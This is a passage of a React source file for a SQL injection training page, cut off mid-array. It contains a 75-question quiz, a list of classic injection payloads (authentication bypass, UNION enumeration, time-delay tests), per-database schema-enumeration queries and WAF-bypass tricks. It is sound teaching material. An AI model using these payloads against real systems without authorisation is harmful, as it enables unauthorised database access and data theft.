import React, { useState, useEffect, useCallback, useMemo } from "react";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  Alert,
  AlertTitle,
  alpha,
  useTheme,
  Divider,
  Fab,
  Drawer,
  LinearProgress,
  useMediaQuery,
  TextField,
  ToggleButton,
  ToggleButtonGroup,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import QuizIcon from "@mui/icons-material/Quiz";
import StorageIcon from "@mui/icons-material/Storage";
import BugReportIcon from "@mui/icons-material/BugReport";
import SecurityIcon from "@mui/icons-material/Security";
import WarningIcon from "@mui/icons-material/Warning";
import ShieldIcon from "@mui/icons-material/Shield";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import SearchIcon from "@mui/icons-material/Search";
import CodeIcon from "@mui/icons-material/Code";
import BuildIcon from "@mui/icons-material/Build";
import LockIcon from "@mui/icons-material/Lock";
import TerminalIcon from "@mui/icons-material/Terminal";
import PublicIcon from "@mui/icons-material/Public";
import SpeedIcon from "@mui/icons-material/Speed";
import DataObjectIcon from "@mui/icons-material/DataObject";
import InfoIcon from "@mui/icons-material/Info";
import SchoolIcon from "@mui/icons-material/School";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import PlayArrowIcon from "@mui/icons-material/PlayArrow";
import HistoryIcon from "@mui/icons-material/History";
import VisibilityIcon from "@mui/icons-material/Visibility";
import TuneIcon from "@mui/icons-material/Tune";
import MemoryIcon from "@mui/icons-material/Memory";
import ApiIcon from "@mui/icons-material/Api";
import { Link, useNavigate } from "react-router-dom";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";

// ========== CODE BLOCK COMPONENT ==========
const CodeBlock: React.FC<{ code: string; language?: string; title?: string }> = ({
  code,
  language = "sql",
  title,
}) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: "#0d1117",
        borderRadius: 2,
        position: "relative",
        my: 2,
        border: "1px solid rgba(249, 115, 22, 0.2)",
      }}
    >
      <Box sx={{ position: "absolute", top: 8, right: 8, display: "flex", gap: 1 }}>
        <Chip label={language} size="small" sx={{ bgcolor: "#f97316", color: "#0b1020", fontWeight: 600 }} />
        <Tooltip title={copied ? "Copied!" : "Copy"}>
          <IconButton size="small" onClick={handleCopy} sx={{ color: "#e2e8f0" }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      {title && (
        <Typography variant="caption" sx={{ color: "#94a3b8", display: "block", mb: 1 }}>
          {title}
        </Typography>
      )}
      <Box
        component="pre"
        sx={{
          m: 0,
          overflow: "auto",
          fontFamily: "'Fira Code', 'Monaco', monospace",
          fontSize: "0.85rem",
          color: "#e2e8f0",
          pt: title ? 0 : 2,
          lineHeight: 1.6,
        }}
      >
        {code}
      </Box>
    </Paper>
  );
};

// ========== QUIZ DATA ==========
const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#f97316";

const quizQuestions: QuizQuestion[] = [
  // ===== FUNDAMENTALS (15 questions) =====
  {
    id: 1,
    topic: "Fundamentals",
    question: "What is SQL injection?",
    options: [
      "A database backup process",
      "Inserting malicious SQL through untrusted input",
      "Encrypting SQL queries",
      "Running SQL in the browser",
    ],
    correctAnswer: 1,
    explanation: "SQL injection happens when untrusted input becomes part of a SQL command.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "SQL injection occurs when an application:",
    options: [
      "Uses HTTPS",
      "Concatenates untrusted input into SQL",
      "Encrypts data at rest",
      "Uses an ORM",
    ],
    correctAnswer: 1,
    explanation: "String concatenation allows user input to change the query structure.",
  },
  {
    id: 3,
    topic: "Fundamentals",
    question: "The primary impact of SQL injection is:",
    options: [
      "Faster queries",
      "Unauthorized data access or modification",
      "Improved caching",
      "Better UI performance",
    ],
    correctAnswer: 1,
    explanation: "Attackers can read, modify, or delete data beyond their permissions.",
  },
  {
    id: 4,
    topic: "Fundamentals",
    question: "The best first-line defense against SQL injection is:",
    options: [
      "Input blacklists",
      "Parameterized queries or prepared statements",
      "Obfuscating SQL",
      "Hiding endpoints",
    ],
    correctAnswer: 1,
    explanation: "Parameters separate data from code, preventing SQL interpretation.",
  },
  {
    id: 5,
    topic: "Fundamentals",
    question: "Why is input validation alone insufficient for SQL injection?",
    options: [
      "It slows the app",
      "Attackers can bypass it and still inject SQL",
      "It breaks TLS",
      "It disables logging",
    ],
    correctAnswer: 1,
    explanation: "Validation helps but does not replace parameterized queries.",
  },
  {
    id: 6,
    topic: "Fundamentals",
    question: "What does SQL stand for?",
    options: [
      "Structured Query Language",
      "Simple Query Logic",
      "Standard Question Language",
      "System Query Lookup",
    ],
    correctAnswer: 0,
    explanation: "SQL stands for Structured Query Language, used to interact with databases.",
  },
  {
    id: 7,
    topic: "Fundamentals",
    question: "Which OWASP category does SQL injection belong to?",
    options: [
      "Broken Access Control",
      "Injection",
      "Security Misconfiguration",
      "Cryptographic Failures",
    ],
    correctAnswer: 1,
    explanation: "SQL injection is a type of injection vulnerability in the OWASP Top 10.",
  },
  {
    id: 8,
    topic: "Fundamentals",
    question: "What character is most commonly used to test for SQL injection?",
    options: [
      "Single quote (')",
      "Semicolon (;)",
      "Asterisk (*)",
      "Ampersand (&)",
    ],
    correctAnswer: 0,
    explanation: "A single quote can break SQL string syntax and reveal vulnerabilities.",
  },
  {
    id: 9,
    topic: "Fundamentals",
    question: "The core problem in SQL injection is:",
    options: [
      "Slow database queries",
      "Data treated as executable code",
      "Missing encryption",
      "Weak passwords",
    ],
    correctAnswer: 1,
    explanation: "SQLi occurs when user data is interpreted as SQL commands.",
  },
  {
    id: 10,
    topic: "Fundamentals",
    question: "Which layer of the application is SQL injection targeting?",
    options: [
      "Presentation layer",
      "Network layer",
      "Data layer",
      "Session layer",
    ],
    correctAnswer: 2,
    explanation: "SQL injection targets the data layer where database queries are executed.",
  },
  {
    id: 11,
    topic: "Fundamentals",
    question: "What is a prepared statement?",
    options: [
      "A pre-compiled SQL template with placeholders for data",
      "A backup of the database",
      "A type of stored procedure",
      "An encrypted query",
    ],
    correctAnswer: 0,
    explanation: "Prepared statements separate SQL structure from data values.",
  },
  {
    id: 12,
    topic: "Fundamentals",
    question: "SQL injection can affect which types of applications?",
    options: [
      "Only web applications",
      "Only mobile apps",
      "Any application that uses SQL databases",
      "Only REST APIs",
    ],
    correctAnswer: 2,
    explanation: "Any application building SQL queries from user input can be vulnerable.",
  },
  {
    id: 13,
    topic: "Fundamentals",
    question: "What is the difference between SQLi and stored XSS?",
    options: [
      "SQLi targets databases, XSS targets browsers",
      "They are the same thing",
      "SQLi is client-side, XSS is server-side",
      "There is no difference",
    ],
    correctAnswer: 0,
    explanation: "SQLi manipulates database queries while XSS injects scripts into web pages.",
  },
  {
    id: 14,
    topic: "Fundamentals",
    question: "Why do ORMs not fully protect against SQL injection?",
    options: [
      "They can be bypassed with raw SQL queries",
      "They don't support parameters",
      "They only work with NoSQL",
      "They always encrypt data",
    ],
    correctAnswer: 0,
    explanation: "ORMs can be misused when developers drop down to raw SQL.",
  },
  {
    id: 15,
    topic: "Fundamentals",
    question: "What is a query parameter placeholder?",
    options: [
      "A symbol like ? or $1 that marks where data should go",
      "A database column name",
      "A type of SQL comment",
      "An encryption key",
    ],
    correctAnswer: 0,
    explanation: "Placeholders mark data positions, keeping them separate from SQL code.",
  },
  // ===== INJECTION TYPES (12 questions) =====
  {
    id: 16,
    topic: "Injection Types",
    question: "Error-based SQL injection relies on:",
    options: [
      "Silent responses",
      "Database error messages",
      "Only timing",
      "Only DNS lookups",
    ],
    correctAnswer: 1,
    explanation: "Error messages can leak query structure and data.",
  },
  {
    id: 17,
    topic: "Injection Types",
    question: "Union-based SQL injection requires:",
    options: [
      "Matching column counts and compatible types",
      "A WAF bypass",
      "A file upload",
      "TLS downgrade",
    ],
    correctAnswer: 0,
    explanation: "Union queries must align column counts and types.",
  },
  {
    id: 18,
    topic: "Injection Types",
    question: "Boolean-based blind SQL injection uses:",
    options: [
      "Response differences for true/false conditions",
      "Syntax errors only",
      "Only DNS callbacks",
      "Stacked queries",
    ],
    correctAnswer: 0,
    explanation: "Attackers infer data from changes in responses.",
  },
  {
    id: 19,
    topic: "Injection Types",
    question: "Time-based SQL injection confirms execution by:",
    options: [
      "Returning rows",
      "Triggering delays like SLEEP",
      "Changing HTTP status only",
      "Dropping tables",
    ],
    correctAnswer: 1,
    explanation: "Delays indicate the injected condition evaluated true.",
  },
  {
    id: 20,
    topic: "Injection Types",
    question: "Out-of-band SQL injection exfiltrates data via:",
    options: [
      "DNS or HTTP requests from the database server",
      "Error messages in the response",
      "Timing differences",
      "Response headers only",
    ],
    correctAnswer: 0,
    explanation: "OOB attacks use external channels the attacker controls.",
  },
  {
    id: 21,
    topic: "Injection Types",
    question: "Second-order SQL injection occurs when:",
    options: [
      "Stored malicious input is used in a later query",
      "Two queries run simultaneously",
      "The database is queried twice",
      "Two users attack at once",
    ],
    correctAnswer: 0,
    explanation: "Second-order attacks exploit stored data used later without proper sanitization.",
  },
  {
    id: 22,
    topic: "Injection Types",
    question: "What makes stacked queries dangerous?",
    options: [
      "They can execute INSERT, UPDATE, DELETE commands",
      "They run faster",
      "They bypass authentication",
      "They encrypt data",
    ],
    correctAnswer: 0,
    explanation: "Stacked queries allow arbitrary SQL execution beyond SELECT.",
  },
  {
    id: 23,
    topic: "Injection Types",
    question: "In-band SQL injection means:",
    options: [
      "Results are returned in the same channel as the attack",
      "The attack uses bandwidth limits",
      "Only network attacks are possible",
      "The database is local",
    ],
    correctAnswer: 0,
    explanation: "In-band attacks receive results directly in the HTTP response.",
  },
  {
    id: 24,
    topic: "Injection Types",
    question: "Which injection type is slowest for data extraction?",
    options: [
      "Time-based blind",
      "Union-based",
      "Error-based",
      "In-band",
    ],
    correctAnswer: 0,
    explanation: "Time-based blind requires waiting for delays for each character.",
  },
  {
    id: 25,
    topic: "Injection Types",
    question: "What is inferential SQL injection?",
    options: [
      "Another name for blind SQL injection",
      "Injection using machine learning",
      "Automated injection",
      "A type of stored procedure attack",
    ],
    correctAnswer: 0,
    explanation: "Inferential/blind SQLi requires deducing data from indirect signals.",
  },
  {
    id: 26,
    topic: "Injection Types",
    question: "UNION SELECT NULL is used to:",
    options: [
      "Determine the number of columns in the query",
      "Delete all data",
      "Create a new table",
      "Encrypt the response",
    ],
    correctAnswer: 0,
    explanation: "Adding NULLs helps find the correct column count for UNION attacks.",
  },
  {
    id: 27,
    topic: "Injection Types",
    question: "Which is NOT a valid SQL injection type?",
    options: [
      "Buffer-based injection",
      "Error-based injection",
      "Time-based blind injection",
      "Union-based injection",
    ],
    correctAnswer: 0,
    explanation: "Buffer-based is a memory corruption attack, not SQL injection.",
  },
  // ===== DETECTION (10 questions) =====
  {
    id: 28,
    topic: "Detection",
    question: "MySQL error 'You have an error in your SQL syntax' suggests:",
    options: [
      "A caching issue",
      "Possible error-based SQL injection",
      "Valid input",
      "TLS failure",
    ],
    correctAnswer: 1,
    explanation: "Syntax errors are a common SQLi signal.",
  },
  {
    id: 29,
    topic: "Detection",
    question: "Repeated 500 errors after adding quotes to input indicates:",
    options: [
      "Potential SQL injection",
      "Successful MFA",
      "CSP violation",
      "Normal traffic",
    ],
    correctAnswer: 0,
    explanation: "Quotes can break query strings and trigger SQL errors.",
  },
  {
    id: 30,
    topic: "Detection",
    question: "Which log source is most useful for detecting SQLi attempts?",
    options: [
      "Application and database logs",
      "DNS logs only",
      "Email logs",
      "Print spooler logs",
    ],
    correctAnswer: 0,
    explanation: "Application and database logs show query errors and unusual patterns.",
  },
  {
    id: 31,
    topic: "Detection",
    question: "A WAF detecting 'UNION SELECT' in a request suggests:",
    options: [
      "A SQL injection attempt",
      "Normal database operation",
      "Successful authentication",
      "File upload in progress",
    ],
    correctAnswer: 0,
    explanation: "UNION SELECT is a common SQLi payload for data extraction.",
  },
  {
    id: 32,
    topic: "Detection",
    question: "Response time of exactly 5 seconds after input with SLEEP(5) indicates:",
    options: [
      "Time-based SQL injection vulnerability",
      "Network latency",
      "Database optimization",
      "Caching working correctly",
    ],
    correctAnswer: 0,
    explanation: "Consistent delays matching the SLEEP value confirm SQLi.",
  },
  {
    id: 33,
    topic: "Detection",
    question: "Which HTTP status code often indicates a SQL error?",
    options: [
      "500 Internal Server Error",
      "200 OK",
      "301 Redirect",
      "404 Not Found",
    ],
    correctAnswer: 0,
    explanation: "Unhandled SQL errors often result in 500 status codes.",
  },
  {
    id: 34,
    topic: "Detection",
    question: "Seeing 'ORA-01756' in a response indicates:",
    options: [
      "Oracle database SQL error",
      "MySQL connection issue",
      "PostgreSQL warning",
      "MongoDB exception",
    ],
    correctAnswer: 0,
    explanation: "ORA- prefixed errors are Oracle database error codes.",
  },
  {
    id: 35,
    topic: "Detection",
    question: "What indicates a successful blind SQLi condition?",
    options: [
      "Different response content for true vs false conditions",
      "Same response every time",
      "404 errors",
      "Faster response times",
    ],
    correctAnswer: 0,
    explanation: "Blind SQLi relies on detecting differences in responses.",
  },
  {
    id: 36,
    topic: "Detection",
    question: "Database audit logs showing access to information_schema suggests:",
    options: [
      "Possible reconnaissance for SQLi attack",
      "Normal application behavior",
      "Backup in progress",
      "Index optimization",
    ],
    correctAnswer: 0,
    explanation: "Attackers query information_schema to discover table structures.",
  },
  {
    id: 37,
    topic: "Detection",
    question: "Which pattern in logs indicates potential SQLi probing?",
    options: [
      `Multiple requests with ', ", --, and # characters`,
      "Normal GET requests",
      "Image file downloads",
      "CSS file requests",
    ],
    correctAnswer: 0,
    explanation: "Special SQL characters in input often indicate injection testing.",
  },
  // ===== PREVENTION (12 questions) =====
  {
    id: 38,
    topic: "Prevention",
    question: "Parameterized queries prevent SQL injection because they:",
    options: [
      "Send SQL and data separately",
      "Encrypt SQL",
      "Hide endpoints",
      "Disable logging",
    ],
    correctAnswer: 0,
    explanation: "Parameters ensure user input cannot alter query structure.",
  },
  {
    id: 39,
    topic: "Prevention",
    question: "Escaping user input alone is:",
    options: [
      "Error-prone and incomplete",
      "Always sufficient",
      "Better than parameters",
      "Required for all queries",
    ],
    correctAnswer: 0,
    explanation: "Escaping rules vary and miss many injection contexts.",
  },
  {
    id: 40,
    topic: "Prevention",
    question: "Dynamic ORDER BY is safest when you:",
    options: [
      "Use an allowlist and map to known columns",
      "Concatenate user input directly",
      "Store input in cookies",
      "Use SELECT * only",
    ],
    correctAnswer: 0,
    explanation: "Identifiers cannot be parameterized, so allowlisting is required.",
  },
  {
    id: 41,
    topic: "Prevention",
    question: "Which query is safest?",
    options: [
      "SELECT * FROM users WHERE id = ?",
      "SELECT * FROM users WHERE id = ' + id + '",
      "SELECT * FROM users WHERE id = ${id}",
      "SELECT * FROM users ORDER BY ' + col",
    ],
    correctAnswer: 0,
    explanation: "The ? placeholder indicates a parameterized query.",
  },
  {
    id: 42,
    topic: "Prevention",
    question: "Least privilege for database accounts means:",
    options: [
      "Only granting permissions needed for the application",
      "Using the root account for simplicity",
      "Sharing credentials across applications",
      "Disabling all security features",
    ],
    correctAnswer: 0,
    explanation: "Limiting permissions reduces the impact of successful SQLi.",
  },
  {
    id: 43,
    topic: "Prevention",
    question: "Input validation should be used:",
    options: [
      "As defense in depth, not as the only protection",
      "Instead of parameterized queries",
      "Only for numeric inputs",
      "Only on the client side",
    ],
    correctAnswer: 0,
    explanation: "Validation adds a layer but cannot replace proper parameterization.",
  },
  {
    id: 44,
    topic: "Prevention",
    question: "Stored procedures can prevent SQLi if they:",
    options: [
      "Use parameterized inputs and don't build dynamic SQL",
      "Are written in any language",
      "Use string concatenation internally",
      "Are encrypted",
    ],
    correctAnswer: 0,
    explanation: "Stored procedures must still use parameters to be safe.",
  },
  {
    id: 45,
    topic: "Prevention",
    question: "What should you do with detailed SQL error messages?",
    options: [
      "Log them server-side but show generic errors to users",
      "Display them to help users debug",
      "Email them to all users",
      "Store them in cookies",
    ],
    correctAnswer: 0,
    explanation: "Detailed errors help attackers; log internally only.",
  },
  {
    id: 46,
    topic: "Prevention",
    question: "Web Application Firewalls (WAFs) are:",
    options: [
      "Defense in depth, not a primary SQLi fix",
      "A complete solution for SQLi",
      "Only useful for XSS",
      "A replacement for input validation",
    ],
    correctAnswer: 0,
    explanation: "WAFs can be bypassed; proper coding is the real solution.",
  },
  {
    id: 47,
    topic: "Prevention",
    question: "Code review for SQLi should focus on:",
    options: [
      "All places where user input reaches database queries",
      "Only login forms",
      "CSS styling",
      "Image optimization",
    ],
    correctAnswer: 0,
    explanation: "Any input path to a query is a potential vulnerability.",
  },
  {
    id: 48,
    topic: "Prevention",
    question: "SAST tools help prevent SQLi by:",
    options: [
      "Automatically finding vulnerable code patterns",
      "Encrypting the database",
      "Blocking network traffic",
      "Compressing queries",
    ],
    correctAnswer: 0,
    explanation: "Static analysis finds SQLi patterns before deployment.",
  },
  {
    id: 49,
    topic: "Prevention",
    question: "Network segmentation helps limit SQLi impact by:",
    options: [
      "Preventing direct database access from compromised web servers",
      "Making queries faster",
      "Encrypting all traffic",
      "Removing the need for authentication",
    ],
    correctAnswer: 0,
    explanation: "Segmentation limits lateral movement after a breach.",
  },
  // ===== DATABASE SPECIFIC (10 questions) =====
  {
    id: 50,
    topic: "Database",
    question: "In MySQL, which function causes a time delay?",
    options: [
      "SLEEP()",
      "WAITFOR DELAY",
      "pg_sleep()",
      "PAUSE()",
    ],
    correctAnswer: 0,
    explanation: "SLEEP() is MySQL's native delay function.",
  },
  {
    id: 51,
    topic: "Database",
    question: "MSSQL time-based injection typically uses:",
    options: [
      "WAITFOR DELAY '0:0:5'",
      "SLEEP(5)",
      "pg_sleep(5)",
      "benchmark()",
    ],
    correctAnswer: 0,
    explanation: "WAITFOR DELAY is MSSQL's mechanism for time delays.",
  },
  {
    id: 52,
    topic: "Database",
    question: "To list tables in MySQL, you would query:",
    options: [
      "information_schema.tables",
      "pg_tables",
      "sysobjects",
      "all_tables",
    ],
    correctAnswer: 0,
    explanation: "MySQL uses information_schema for metadata.",
  },
  {
    id: 53,
    topic: "Database",
    question: "PostgreSQL uses which function for time delays?",
    options: [
      "pg_sleep()",
      "SLEEP()",
      "WAITFOR DELAY",
      "DELAY()",
    ],
    correctAnswer: 0,
    explanation: "pg_sleep() is PostgreSQL's delay function.",
  },
  {
    id: 54,
    topic: "Database",
    question: "Oracle string concatenation uses:",
    options: [
      "The || operator",
      "The + operator",
      "CONCAT only",
      "The & operator",
    ],
    correctAnswer: 0,
    explanation: "Oracle uses || for string concatenation.",
  },
  {
    id: 55,
    topic: "Database",
    question: "SQLite metadata is stored in:",
    options: [
      "sqlite_master",
      "information_schema",
      "sysobjects",
      "pg_catalog",
    ],
    correctAnswer: 0,
    explanation: "sqlite_master contains table and schema information.",
  },
  {
    id: 56,
    topic: "Database",
    question: "MSSQL string concatenation uses:",
    options: [
      "The + operator",
      "The || operator",
      "CONCAT only",
      "The & operator",
    ],
    correctAnswer: 0,
    explanation: "MSSQL uses + for string concatenation.",
  },
  {
    id: 57,
    topic: "Database",
    question: "Which database uses -- for single-line comments?",
    options: [
      "All major SQL databases",
      "Only MySQL",
      "Only PostgreSQL",
      "None of them",
    ],
    correctAnswer: 0,
    explanation: "Double-dash comments work across SQL implementations.",
  },
  {
    id: 58,
    topic: "Database",
    question: "MySQL-specific comment syntax includes:",
    options: [
      "# for single-line comments",
      "// for comments",
      "REM for comments",
      "' for comments",
    ],
    correctAnswer: 0,
    explanation: "MySQL uniquely supports # as a comment character.",
  },
  {
    id: 59,
    topic: "Database",
    question: "To get the current user in PostgreSQL:",
    options: [
      "SELECT current_user",
      "SELECT @@user",
      "SELECT USER()",
      "SELECT SUSER_NAME()",
    ],
    correctAnswer: 0,
    explanation: "current_user is the PostgreSQL syntax.",
  },
  // ===== TOOLS (8 questions) =====
  {
    id: 60,
    topic: "Tools",
    question: "SQLMap's --dbs flag is used to:",
    options: [
      "Enumerate available databases",
      "Delete databases",
      "Create backups",
      "Configure SSL",
    ],
    correctAnswer: 0,
    explanation: "--dbs lists all databases accessible through the injection point.",
  },
  {
    id: 61,
    topic: "Tools",
    question: "SQLMap's -r flag is used to:",
    options: [
      "Load a saved HTTP request from a file",
      "Run recursively",
      "Generate reports",
      "Restart the scan",
    ],
    correctAnswer: 0,
    explanation: "The -r flag tests requests saved from Burp or other tools.",
  },
  {
    id: 62,
    topic: "Tools",
    question: "SQLMap tamper scripts are used to:",
    options: [
      "Modify payloads to bypass WAFs",
      "Encrypt database connections",
      "Create backups",
      "Generate documentation",
    ],
    correctAnswer: 0,
    explanation: "Tamper scripts transform payloads to evade filters.",
  },
  {
    id: 63,
    topic: "Tools",
    question: "The --level and --risk options in SQLMap control:",
    options: [
      "Testing depth and aggressiveness",
      "Output formatting",
      "Network bandwidth",
      "File permissions",
    ],
    correctAnswer: 0,
    explanation: "Higher levels test more injection points and payloads.",
  },
  {
    id: 64,
    topic: "Tools",
    question: "OWASP ZAP is:",
    options: [
      "A free web application security scanner",
      "A database backup tool",
      "A code editor",
      "A network monitor",
    ],
    correctAnswer: 0,
    explanation: "ZAP is an open-source alternative to Burp Suite.",
  },
  {
    id: 65,
    topic: "Tools",
    question: "Burp Suite is primarily used for:",
    options: [
      "Intercepting and modifying HTTP requests",
      "Writing SQL queries",
      "Database administration",
      "Network monitoring only",
    ],
    correctAnswer: 0,
    explanation: "Burp Suite is a web security testing proxy.",
  },
  {
    id: 66,
    topic: "Tools",
    question: "SQLMap's --dump flag is used to:",
    options: [
      "Extract data from specified tables",
      "Delete database content",
      "Create database dumps for backup",
      "Analyze query performance",
    ],
    correctAnswer: 0,
    explanation: "--dump extracts data from discovered tables.",
  },
  {
    id: 67,
    topic: "Tools",
    question: "SQLMap's --proxy option is used to:",
    options: [
      "Route traffic through Burp or another proxy",
      "Speed up scanning",
      "Encrypt the connection",
      "Bypass authentication",
    ],
    correctAnswer: 0,
    explanation: "Proxy routing allows traffic inspection and modification.",
  },
  // ===== ADVANCED / WAF BYPASS (8 questions) =====
  {
    id: 68,
    topic: "Advanced",
    question: "What is the purpose of case manipulation in WAF bypass?",
    options: [
      "Evade simple pattern matching filters",
      "Encrypt the payload",
      "Speed up query execution",
      "Compress data",
    ],
    correctAnswer: 0,
    explanation: "Mixed case (SeLeCt) can bypass filters looking for specific patterns.",
  },
  {
    id: 69,
    topic: "Advanced",
    question: "Comment injection (SEL/**/ECT) works because:",
    options: [
      "SQL parsers ignore comments but execute the keywords",
      "It encrypts the query",
      "It creates a stored procedure",
      "It disables logging",
    ],
    correctAnswer: 0,
    explanation: "Comments break up keyword patterns while SQL processes the full statement.",
  },
  {
    id: 70,
    topic: "Advanced",
    question: "Double URL encoding (%2527) is useful when:",
    options: [
      "The application decodes input twice",
      "Using HTTPS",
      "Connecting to MongoDB",
      "Running local queries",
    ],
    correctAnswer: 0,
    explanation: "Multiple decoding passes can restore malicious characters.",
  },
  {
    id: 71,
    topic: "Advanced",
    question: "HTTP Parameter Pollution can bypass WAFs by:",
    options: [
      "Sending duplicate parameters that confuse parsers",
      "Encrypting the request",
      "Using HTTPS",
      "Changing the HTTP method",
    ],
    correctAnswer: 0,
    explanation: "Different components may parse duplicate parameters differently.",
  },
  {
    id: 72,
    topic: "Advanced",
    question: "CHAR(65,66,67) in SQL represents:",
    options: [
      "The string 'ABC' built from ASCII codes",
      "A table name",
      "A numeric calculation",
      "A date format",
    ],
    correctAnswer: 0,
    explanation: "CHAR() builds strings from ASCII values to bypass filters.",
  },
  {
    id: 73,
    topic: "Advanced",
    question: "Null byte injection (%00) can:",
    options: [
      "Terminate strings early in some parsers",
      "Speed up queries",
      "Encrypt payloads",
      "Create database backups",
    ],
    correctAnswer: 0,
    explanation: "Null bytes can confuse string handling in some languages.",
  },
  {
    id: 74,
    topic: "Advanced",
    question: "Using /*! MySQL-specific */ comments allows:",
    options: [
      "Executing code only on MySQL servers",
      "Commenting out all databases",
      "Encrypting queries",
      "Disabling logging",
    ],
    correctAnswer: 0,
    explanation: "MySQL executes content in /*! */ comments, others ignore it.",
  },
  {
    id: 75,
    topic: "Advanced",
    question: "Whitespace alternatives like %09 (tab) can:",
    options: [
      "Bypass filters looking for spaces",
      "Speed up queries",
      "Encrypt the payload",
      "Create indexes",
    ],
    correctAnswer: 0,
    explanation: "SQL treats tabs and newlines as whitespace, but filters may not.",
  },
];

// ========== DATA DEFINITIONS ==========
const sqliTypes = [
  {
    type: "Error-based",
    description: "Database errors leak details about the query or schema.",
    signals: "500 errors, SQL syntax messages, stack traces.",
    risk: "Fast data exposure and easy confirmation.",
    color: "#ef4444",
  },
  {
    type: "Union-based",
    description: "Attacker forces the query to merge extra results.",
    signals: "Unexpected data appearing in responses.",
    risk: "Direct data extraction if output is visible.",
    color: "#f97316",
  },
  {
    type: "Boolean-based (blind)",
    description: "Responses change when a condition is true or false.",
    signals: "Small but consistent response differences.",
    risk: "Slow, but reliable data extraction.",
    color: "#eab308",
  },
  {
    type: "Time-based (blind)",
    description: "The database delays responses to signal true conditions.",
    signals: "Consistent timing delays on specific inputs.",
    risk: "Harder to detect, can still extract data.",
    color: "#22c55e",
  },
  {
    type: "Out-of-band",
    description: "Database makes outbound requests to attacker-controlled systems.",
    signals: "Unexpected DNS or HTTP requests from database servers.",
    risk: "Bypasses normal response channels.",
    color: "#3b82f6",
  },
  {
    type: "Second-order",
    description: "Malicious input is stored first, then used later in a query.",
    signals: "Delayed effects, often in admin views or background jobs.",
    risk: "Harder to trace back to original input.",
    color: "#8b5cf6",
  },
];

const commonPayloads = [
  { category: "Authentication Bypass", payload: "' OR '1'='1", use: "Login forms" },
  { category: "Authentication Bypass", payload: "admin'--", use: "Comment out password check" },
  { category: "Authentication Bypass", payload: "' OR 1=1#", use: "MySQL specific" },
  { category: "Union Select", payload: "' UNION SELECT NULL--", use: "Find number of columns" },
  { category: "Union Select", payload: "' UNION SELECT NULL,NULL,NULL--", use: "Match column count" },
  { category: "Information Gathering", payload: "' UNION SELECT @@version--", use: "Get database version" },
  { category: "Information Gathering", payload: "' UNION SELECT user()--", use: "Get current user" },
  { category: "String Extraction", payload: "' UNION SELECT table_name FROM information_schema.tables--", use: "List tables" },
  { category: "Blind Test", payload: "' AND '1'='1", use: "Boolean true condition" },
  { category: "Blind Test", payload: "' AND '1'='2", use: "Boolean false condition" },
  { category: "Time-Based", payload: "' AND SLEEP(5)--", use: "MySQL time delay" },
  { category: "Time-Based", payload: "'; WAITFOR DELAY '0:0:5'--", use: "MSSQL time delay" },
];

const dbSpecificTechniques = [
  {
    database: "MySQL",
    versionQuery: "SELECT @@version",
    currentUser: "SELECT user(), current_user()",
    listDatabases: "SELECT schema_name FROM information_schema.schemata",
    listTables: "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
    timeBased: "SLEEP(5)",
    comments: "-- comment, # comment, /* comment */",
    stringConcat: "CONCAT(str1, str2)",
    color: "#00758f",
  },
  {
    database: "PostgreSQL",
    versionQuery: "SELECT version()",
    currentUser: "SELECT current_user, session_user",
    listDatabases: "SELECT datname FROM pg_database",
    listTables: "SELECT tablename FROM pg_tables WHERE schemaname='public'",
    timeBased: "pg_sleep(5)",
    comments: "-- comment, /* comment */",
    stringConcat: "string1 || string2",
    color: "#336791",
  },
  {
    database: "MSSQL",
    versionQuery: "SELECT @@version",
    currentUser: "SELECT SYSTEM_USER, USER_NAME()",
    listDatabases: "SELECT name FROM master..sysdatabases",
    listTables: "SELECT name FROM sysobjects WHERE xtype='U'",
    timeBased: "WAITFOR DELAY '0:0:5'",
    comments: "-- comment, /* comment */",
    stringConcat: "str1 + str2",
    color: "#cc2927",
  },
  {
    database: "Oracle",
    versionQuery: "SELECT banner FROM v$version",
    currentUser: "SELECT user FROM dual",
    listDatabases: "SELECT DISTINCT owner FROM all_tables",
    listTables: "SELECT table_name FROM all_tables",
    timeBased: "DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)",
    comments: "-- comment, /* comment */",
    stringConcat: "str1 || str2",
    color: "#f80000",
  },
  {
    database: "SQLite",
    versionQuery: "SELECT sqlite_version()",
    currentUser: "N/A (file-based)",
    listDatabases: "PRAGMA database_list",
    listTables: "SELECT name FROM sqlite_master WHERE type='table'",
    timeBased: "No native sleep",
    comments: "-- comment, /* comment */",
    stringConcat: "str1 || str2",
    color: "#003b57",
  },
];

const caseStudies = [
  {
    name: "Heartland Payment Systems (2008)",
    impact: "130 million credit card numbers stolen",
    technique: "SQL injection in payment processing system",
    lesson: "Even major payment processors can have SQLi vulnerabilities. Defense in depth and network segmentation are critical.",
    cost: "$140 million in fines and remediation",
  },
  {
    name: "Sony PlayStation Network (2011)",
    impact: "77 million user accounts compromised",
    technique: "SQL injection exploited to access user database",
    lesson: "Proper input validation and parameterized queries could have prevented the breach.",
    cost: "$171 million estimated total cost",
  },
  {
    name: "Yahoo Voices (2012)",
    impact: "450,000 plaintext passwords leaked",
    technique: "Union-based SQL injection",
    lesson: "Never store passwords in plaintext. Always use parameterized queries.",
    cost: "Significant reputation damage",
  },
  {
    name: "TalkTalk (2015)",
    impact: "157,000 customer records stolen",
    technique: "SQL injection in legacy web pages",
